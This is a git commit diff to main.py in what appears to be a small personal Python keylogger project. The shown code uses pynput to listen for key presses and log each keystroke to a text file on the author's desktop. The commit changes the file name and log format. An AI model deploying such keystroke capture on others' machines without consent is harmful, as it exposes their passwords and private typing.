5727d4ed3210740003bef8010fdc6d17d1bb926a
Benjamin Pollak <benjaminwpollak@gmail.com>
2018-03-31 17:28:41 -0500

    save for branch

--- main.py
+++ main.py
@@ -1,9 +1,10 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-file_log = 'C:\\Users\\Benjamin Pollak\\Desktop\\loggo.txt'
+file_log = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
 
-logging.basicConfig(filename=(file_log), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+#logging.basicConfig(filename=(file_log), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(filename=(file_log), level=logging.DEBUG, format='%(message)s')
 
 def on_press(key):
     logging.info(str(key))
